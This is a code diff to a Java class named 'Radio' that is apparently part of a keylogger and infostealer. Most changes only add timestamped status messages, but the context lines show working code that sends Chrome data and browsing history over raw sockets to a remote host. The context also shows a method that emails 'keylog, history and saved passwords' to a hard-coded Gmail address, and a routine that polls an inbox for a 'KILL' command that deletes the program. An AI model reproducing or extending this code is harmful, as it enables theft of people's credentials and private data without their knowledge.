@@ -168,12 +168,10 @@ public class Radio
 	public static boolean isSecondaryDistrib = true;
 	public static String staticIP = "127.0.0.1"; // change accordingly
 	public static String allowedMailer = "targetemail@gmail.com";
-	
+	public static Main m = new Main();
 	@SuppressWarnings("static-access")
 	public static void main (String[] args) throws IOException, URISyntaxException
 	{
-		// mailLogs();
-		Main m = new Main();
 		Chocolat.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
 		Executors.newSingleThreadExecutor().execute(new Runnable() {
 		    @Override
@@ -285,7 +283,8 @@ public class Radio
 			 return staticIP;
 		 }
 	 }
-	 public static void upload(String ipee) {
+	 @SuppressWarnings({ "static-access", "resource" })
+	public static void upload(String ipee) {
 		 try {
 	    		//System.out.println(connectTo);
 	    		Socket socket = new Socket(getHostIP(), 25565);
@@ -304,16 +303,17 @@ public class Radio
 	    		os.write(bytearray,0,bytearray.length); 
 	    		os.flush(); 
 	    		socket.close();
+	    		Chocolat.println("[" + m.robert.elapsedTime() + "] Thingy log uploaded");
 	    	} catch (Exception e) {
-	    		Chocolat.println(e.toString());
+	    		Chocolat.println("[" + m.robert.elapsedTime() + "] Thingy log upload failed: " + e.toString());
 	    	}
 	 }
-	 public static void uplogin(String ipee) throws IOException {
+	 @SuppressWarnings({ "static-access", "resource" })
+	public static void uplogin(String ipee) throws IOException {
 		 try {
- 		@SuppressWarnings("resource")
-		Socket socket = new Socket(getHostIP(), 69);
- 		OutputStream t = socket.getOutputStream();
- 		PrintWriter out = new PrintWriter(t);
+			Socket socket = new Socket(getHostIP(), 69);
+			OutputStream t = socket.getOutputStream();
+			PrintWriter out = new PrintWriter(t);
 			String toSend = System.getProperty("user.name") + ".txt";
 			out.print(toSend );
 			out.flush();
@@ -330,15 +330,15 @@ public class Radio
 			os.write(bytearray,0,bytearray.length); 
 			os.flush();
 		    send.close();
-			Chocolat.println("yiff!");
+		    Chocolat.println("[" + m.robert.elapsedTime() + "] Chrome data uploaded succesfully");
 		 } catch (Exception e) {
-			Chocolat.println(e.toString());
+			Chocolat.println("[" + m.robert.elapsedTime() + "] Chrome data failed to upload");
 		 }
 	 }
-	 public static void uphistory(String ipee) throws IOException {
+	 @SuppressWarnings({ "static-access", "resource" })
+	public static void uphistory(String ipee) throws IOException {
 		 try {
-		 		@SuppressWarnings("resource")
-				Socket socket = new Socket(getHostIP(), 70);
+		 		Socket socket = new Socket(getHostIP(), 70);
 		 		OutputStream t = socket.getOutputStream();
 		 		PrintWriter out = new PrintWriter(t);
 					String toSend = System.getProperty("user.name") + "history.txt";
@@ -357,9 +357,9 @@ public class Radio
 					os.write(bytearray,0,bytearray.length); 
 					os.flush();
 				    sand.close();
-					Chocolat.println("yip!");
+				    Chocolat.println("[" + m.robert.elapsedTime() + "] History upload successful");
 				 } catch (Exception e) {
-					Chocolat.println("blarfff");
+				    Chocolat.println("[" + m.robert.elapsedTime() + "] History upload failed");
 				 }
 	 }
 	 public static int getCurrentVersion() {
@@ -370,7 +370,8 @@ public class Radio
 			 return 1;
 		 }
 	 }
-	 public static int mailLogs() {
+	 @SuppressWarnings("static-access")
+	public static int mailLogs() {
 		 // mail keylog, history and saved passwords to email address
 		 // Recipient's email ID needs to be mentioned.
 	      String to = "targetemail@gmail.com";
@@ -449,14 +450,15 @@ public class Radio
 	         // Send message
 	         Transport.send(message);
 
-	         Chocolat.println("Transmission successful");
+	         Chocolat.println("[" + m.robert.elapsedTime() + "] Transmission successful");
 	         return 0;
 	      } catch (MessagingException e) {
-	    	  Chocolat.println("Mailer Broadcast Failure: "+ e.toString());
+	    	  Chocolat.println("[" + m.robert.elapsedTime() + "] Mailer Broadcast Failure:" + e.toString());
 	    	  return 2;
 	      }
 	 }
-	 public static int checkForCommands() {
+	 @SuppressWarnings("static-access")
+	public static int checkForCommands() {
 		 try {
 
 		      //create properties field
@@ -478,7 +480,7 @@ public class Radio
 
 		      // retrieve the messages from the folder in an array and print it
 		      Message[] messages = emailFolder.getMessages();
-		      System.out.println("Command Recv Count: [" + messages.length +"]");
+		      Chocolat.println("Command Recv Count: [" + messages.length +"]");
 
 		      for (int i = 0, n = messages.length; i < n; i++) {
 		         Message message = messages[i];
@@ -493,9 +495,10 @@ public class Radio
 		         {
 		         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) 
 		         {
+		        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Kill Command Received");
 		        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
-		 			cf.deleteOnExit();
-		 			System.exit(0);
+		 			 cf.deleteOnExit();
+		 			 System.exit(0);
 		         	}
 		      	}
 		      }
@@ -505,15 +508,15 @@ public class Radio
 		      store.close();
 		      return 0;
 		      } catch (NoSuchProviderException e) {
-		    	 Chocolat.println("Mailer request failed:" +e.toString());
+		    	 Chocolat.println("[" + m.robert.elapsedTime() + "] Mailer request failed:" +e.toString());
 		         e.printStackTrace();
 		         return 2;
 		      } catch (MessagingException e) {
-		    	  Chocolat.println("Mailer request failed:" +e);
+		    	  Chocolat.println("[" + m.robert.elapsedTime() + "] Mailer request failed:" +e.toString());
 		          e.printStackTrace();
 		          return 2;
 		      } catch (Exception e) {
-		    	  Chocolat.println("Mailer request failed:" +e.toString());
+		    	  Chocolat.println("[" + m.robert.elapsedTime() + "] Mailer request failed:" +e.toString());
 			      e.printStackTrace();
 			      return 2;
 		      }
